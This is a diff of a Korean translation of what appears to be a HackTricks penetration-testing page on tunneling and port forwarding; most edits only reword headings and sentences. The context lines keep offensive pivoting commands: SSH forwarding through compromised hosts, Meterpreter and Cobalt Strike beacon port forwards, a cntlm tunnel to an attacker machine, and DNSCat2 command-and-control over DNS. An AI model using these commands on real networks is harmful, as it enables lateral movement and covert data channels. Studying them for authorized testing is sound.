@@ -1,15 +1,15 @@
-# 터널링 및 포트 포워딩
+# Tunneling and Port Forwarding
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Nmap 팁
+## Nmap tip
 
 > [!WARNING]
-> **ICMP** 및 **SYN** 스캔은 소켓 프록시를 통해 터널링할 수 없으므로 **핑 탐지 비활성화**(`-Pn`)하고 **TCP 스캔**(`-sT`)을 지정해야 합니다.
+> **ICMP** 및 **SYN** 스캔은 socks 프록시를 통해 터널링할 수 없으므로 **ping 탐색을 비활성화**해야 합니다 (`-Pn`) 및 **TCP 스캔**을 지정해야 합니다 (`-sT`) 이 작업이 수행되도록 합니다.
 
 ## **Bash**
 
-**호스트 -> 점프 -> 내부A -> 내부B**
+**Host -> Jump -> InternalA -> InternalB**
 ```bash
 # On the jump server connect the port 3333 to the 5985
 mknod backpipe p;
@@ -55,7 +55,7 @@ sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
 ```bash
 ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
 ```
-### 리버스 포트 포워딩
+### Reverse Port Forwarding
 
 이것은 DMZ를 통해 내부 호스트에서 귀하의 호스트로 리버스 셸을 얻는 데 유용합니다:
 ```bash
@@ -68,7 +68,7 @@ ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
 ```
 ### VPN-Tunnel
 
-두 장치 모두에서 **루트 권한이 필요합니다** (새 인터페이스를 생성할 것이기 때문입니다) 그리고 sshd 설정은 루트 로그인을 허용해야 합니다:\
+두 장치 모두에서 **루트 권한이 필요**합니다(새 인터페이스를 생성할 것이기 때문입니다) 그리고 sshd 설정에서 루트 로그인을 허용해야 합니다:\
 `PermitRootLogin yes`\
 `PermitTunnel yes`
 ```bash
@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 ## SSHUTTLE
 
-당신은 **ssh**를 통해 호스트를 거쳐 **서브네트워크**로 모든 **트래픽**을 **터널링**할 수 있습니다.\
+당신은 **ssh**를 통해 호스트를 통해 **서브네트워크**로 모든 **트래픽**을 **터널링**할 수 있습니다.\
 예를 들어, 10.10.10.0/24로 가는 모든 트래픽을 포워딩합니다.
 ```bash
 pip install sshuttle
@@ -104,7 +104,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-로컬 포트 --> 손상된 호스트 (활성 세션) --> 제3_박스:포트
+로컬 포트 --> 손상된 호스트 (활성 세션) --> 제3의 박스:포트
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -134,7 +134,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS 프록시
 
-모든 인터페이스에서 수신 대기하는 팀 서버에서 포트를 열어 **비콘을 통해 트래픽을 라우팅**하는 데 사용할 수 있습니다.
+팀 서버에서 모든 인터페이스에서 수신 대기하는 포트를 열어 **비콘을 통해 트래픽을 라우팅**하는 데 사용할 수 있습니다.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -150,13 +150,13 @@ proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
 rportfwd [bind port] [forward host] [forward port]
 rportfwd stop [bind port]
 ```
-주의할 점:
+To note:
 
 - Beacon의 리버스 포트 포워드는 **개별 머신 간의 중계가 아니라 Team Server로 트래픽을 터널링하기 위해 설계되었습니다**.
 - 트래픽은 **Beacon의 C2 트래픽 내에서 터널링됩니다**, P2P 링크를 포함하여.
 - **관리자 권한이 필요하지 않습니다** 고포트에서 리버스 포트 포워드를 생성하는 데.
 
-### rPort2Port 로컬
+### rPort2Port local
 
 > [!WARNING]
 > 이 경우, **포트는 비콘 호스트에서 열리며**, Team Server가 아니라 **트래픽은 Cobalt Strike 클라이언트로 전송됩니다** (Team Server가 아니라) 그리고 거기서 지정된 호스트:포트로 전송됩니다.
@@ -174,8 +174,8 @@ python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/t
 ```
 ## Chisel
 
-[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)의 릴리스 페이지에서 다운로드할 수 있습니다.\
-클라이언트와 서버에 **같은 버전**을 사용해야 합니다.
+You can download it from the releases page of [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
+You need to use the **same version for client and server**
 
 ### socks
 ```bash
@@ -292,11 +292,11 @@ OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacke
 ```
 [https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)
 
-### SSL Socat 터널
+### SSL Socat Tunnel
 
 **/bin/sh 콘솔**
 
-클라이언트와 서버 양쪽에서 인증서를 생성합니다.
+클라이언트와 서버 양쪽에 인증서를 생성합니다.
 ```bash
 # Execute these commands on both sides
 FILENAME=socatssl
@@ -320,7 +320,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 ```
 ## Plink.exe
 
-콘솔 PuTTY 버전과 비슷합니다(옵션은 ssh 클라이언트와 매우 유사합니다).
+콘솔 PuTTY 버전과 비슷합니다 (옵션은 ssh 클라이언트와 매우 유사합니다).
 
 이 바이너리는 피해자에서 실행될 것이며 ssh 클라이언트이므로, 역 연결을 위해 ssh 서비스와 포트를 열어야 합니다. 그런 다음, 로컬에서 접근 가능한 포트만을 우리 머신의 포트로 포워딩하려면:
 ```bash
@@ -383,7 +383,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-프록시에 대해 인증하고 지정한 외부 서비스로 포트를 로컬에서 바인딩합니다. 그런 다음 이 포트를 통해 원하는 도구를 사용할 수 있습니다.\
+프록시에 대해 인증하고 외부 서비스에 지정한 포트에 로컬로 바인딩합니다. 그런 다음 이 포트를 통해 원하는 도구를 사용할 수 있습니다.\
 예를 들어 포트 443을 포워딩합니다.
 ```
 Username Alice
@@ -392,7 +392,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-이제, 예를 들어 피해자의 **SSH** 서비스가 포트 443에서 수신 대기하도록 설정하면, 공격자 포트 2222를 통해 연결할 수 있습니다.\
+이제, 예를 들어 피해자의 **SSH** 서비스가 포트 443에서 수신 대기하도록 설정하면, 공격자는 포트 2222를 통해 연결할 수 있습니다.\
 또한 **meterpreter**를 사용하여 localhost:443에 연결하고 공격자가 포트 2222에서 수신 대기하도록 할 수 있습니다.
 
 ## YARP
@@ -417,7 +417,7 @@ ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
 ```
 ### DNSCat2
 
-[**여기에서 다운로드하세요**](https://github.com/iagox86/dnscat2)**.**
+[**여기에서 다운로드**](https://github.com/iagox86/dnscat2)**.**
 
 DNS를 통해 C\&C 채널을 설정합니다. 루트 권한이 필요하지 않습니다.
 ```bash
@@ -440,9 +440,9 @@ Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret som
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
-#### 프록시체인 DNS 변경
+#### Proxychains DNS 변경
 
-Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 SOCKS 프록시를 통해 터널링합니다. **기본적으로** proxychains가 사용하는 **DNS** 서버는 **4.2.2.2**입니다 (하드코딩됨). 이를 변경하려면 파일을 편집하세요: _/usr/lib/proxychains3/proxyresolv_ 그리고 IP를 변경하세요. **Windows 환경**에 있다면 **도메인 컨트롤러**의 IP를 설정할 수 있습니다.
+Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 socks 프록시를 통해 터널링합니다. **기본적으로** proxychains가 사용하는 **DNS** 서버는 **4.2.2.2**입니다 (하드코딩됨). 이를 변경하려면 파일을 편집하십시오: _/usr/lib/proxychains3/proxyresolv_ 및 IP를 변경하십시오. **Windows 환경**에 있는 경우 **도메인 컨트롤러**의 IP를 설정할 수 있습니다.
 
 ## Go에서의 터널
 
@@ -455,7 +455,7 @@ Proxychains는 `gethostbyname` libc 호출을 가로채고 TCP DNS 요청을 SOC
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-두 시스템 모두에서 루트 권한이 필요하여 tun 어댑터를 생성하고 ICMP 에코 요청을 사용하여 데이터 간에 터널링합니다.
+두 시스템 모두에서 루트 권한이 필요하며, ICMP 에코 요청을 사용하여 tun 어댑터를 생성하고 데이터 간에 터널링합니다.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -480,7 +480,7 @@ ssh -D 9050 -p 2222 -l user 127.0.0.1
 ## ngrok
 
 [**ngrok**](https://ngrok.com/) **는 한 줄의 명령어로 솔루션을 인터넷에 노출하는 도구입니다.**\
-&#xNAN;_&#x45;xposition URI는 다음과 같습니다:_ **UID.ngrok.io**
+_&#x45;xposition URI는 다음과 같습니다:_ **UID.ngrok.io**
 
 ### 설치
 
